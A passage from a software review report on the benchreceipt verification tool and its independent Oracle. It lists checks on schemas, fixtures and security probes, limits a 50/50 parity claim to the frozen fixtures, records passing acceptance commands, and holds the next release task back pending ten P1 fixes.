  one-line stderr message, never a traceback-as-pass; `cli.main`
  returns `int`; `pyproject.toml` declares the `benchreceipt`
  console script with zero runtime dependencies; `ci.yml` steps match
  `build_parser` flags and the policy's 4 required jobs.
- **Oracle independence (the property itself):** the Oracle imports
  only Node built-ins (`node:crypto`, `node:fs`, `node:path`), shares
  no code with `src/benchreceipt/`, has zero npm dependencies, and
  makes zero network requests. Independence is real — the problem is
  **fidelity**, not independence (F-02–F-08).
- **Schema/policy:** the hand-rolled validator enforces every keyword
  the frozen schemas use (`type` with bool≠int, `const`, `enum`,
  `required`, `properties`, `additionalProperties`,
  `propertyNames`, `min/maxItems/Properties/Length`, `pattern`,
  `minimum/maximum`, local `$ref` with correct `~0`/`~1` order);
  `capture` emits exactly the fields `run.v1` requires; pre-v1.1.0
  receipts (no after-fields) still validate; `result.v1` admits no
  `null` where `verify` might emit one.
- **Fixture/Golden circularity:** `build_fixtures.py` does **not**
  write `GOLDEN.json` (verified by reading it); Golden expected
  values are hand-written and the gate compares both implementations
  against them. No circularity found.
- **T011 probes:** the resumed T011 battery (path traversal, oversize,
  XXE, redaction of the *documented* set, hash forgery, schema
  confusion, command injection, job identity, manifest tampering)
  was re-checked against the code where cheap; the documented-set
  redaction and the traversal/hash cases hold. F-09 extends probe (d)
  beyond the documented flag set; F-01 is a new case the battery did
  not cover (two same-kind reports).

## Call on T013-item-result-v1 (per-job detail missing from `result.v1`)

**NOT blocking for T014.** `benchreceipt.result/v1` carries aggregate
findings only (status, `jobs_verified`, missing/unexpected/duplicate
job ids, reason codes, identity mismatches, report errors). It does
not carry per-job OS/runtime/run id/attempt/test counts, passing-job
HEAD/tree SHAs, or artifact digests/sizes — the renderer
(`render/html.py`) already labels every such field honestly as "not
recorded in this verification result" instead of inventing values.
The per-job detail lives where it belongs for this design: the
per-job receipts and the bundle manifest. No verdict depends on the
missing detail, and the S0 gate compares complete results. Adding
per-job detail would require a schema change (new optional fields in
`result.v1`, i.e. a v1.1 decision with ADR + spec bump) — that is a
follow-up product decision, not a freeze blocker. Recommended: record
it as a T014-adjacent spec item (optional `jobs[]` detail in a future
`result.v1.1`), not as a gate.

## Qualification of the S0 parity claim

The S0 gate re-run in this review again reports parity **50/50**
(see §Acceptance). That claim is true **for the 50 frozen fixtures
only**. This review shows the Oracle diverges from production on
whole input classes outside the fixtures (F-02–F-08: malformed LCOV,
JUnit attribute mismatches, malformed/DOCTYPE JUnit, CDATA/comments,
self-closing and namespaced elements, symlinked reports,
schema-invalid receipts, duplicate-key policies, pinned run
identity). Parity on 50 fixtures is therefore **not** evidence that
the Oracle would catch a production regression in any of those
areas. The parity claim in `oracle/README.md` and the S0 report
should be qualified accordingly until the Oracle fidelity gaps are
fixed and adversarial fixtures are added to S0.

## Acceptance (all run by this reviewer, fresh, on branch `t013-review`)

| Command (from `02_source`, `.venv` Python 3.12.3, `TMPDIR=…/.tmp`) | Exit | Result | Log |
|---|---|---|---|
| `python scripts/verify_review_pack.py` | 0 | PASS — commit `cfede27…`, 45 index rows, 37 pack rows, 34 key files all listed, all SHA-256 + line counts match | `03_evidence/t013-review/verify_review_pack.log` |
| `python scripts/check_review_coverage.py` | 0 | PASS — all 34 key files reviewed (see below) | `03_evidence/t013-review/check_coverage.log` |
| `TMPDIR=…/.tmp ../.venv/bin/python -m pytest -q` | 0 | **683 passed** in 22.57 s | `03_evidence/t013-review/pytest-t013-review.log` |
| `python scripts/s0_gate.py --out-dir ../03_evidence/t013-review/s0` | 0 | **S0 PASS 10/10** — 16/16 controls, 34/34 faults, false PASS 0, false block 0, parity 50/50, repeat-100 1 hash, P95 0.0799 s, 0 network refs, 77 receipts 0 violations | `03_evidence/t013-review/s0-gate-t013-review.log` |
| `node --test oracle/*.test.mjs` | 0 | **8/8 pass** | `03_evidence/t013-review/oracle-t013-review.log` |

Repro evidence: `03_evidence/t013-review/repro-part1.log` …
`repro-part7.log` (outputs) and `repro.py`, `repro2.py` … `repro7.py`
(the runnable repro scripts). Note the repro scripts live under
`03_evidence/t013-review/` (evidence, not product code) and use only
the frozen code paths plus scratch dirs under `/tmp/t013-repro/`.

## Coverage

`04_review/REVIEW_COVERAGE.csv` — **34/34 key production files,
`reviewed=yes`**, no gaps. Coverage check passes (exit 0).

## Verdict

**T014 MUST WAIT.** P0 = 0, **P1 = 10** (F-01–F-10). Per
IMPLEMENTATION_PLAN §T013, the P1s return to a FIX task; T014 must
not freeze until they are fixed and the acceptance commands (plus
regression repros R24, R2–R8, R1b, R11 and new S0 fixtures covering
the Oracle gaps) are re-run green. The T013-item-result-v1 question
is answered above: **not blocking**.
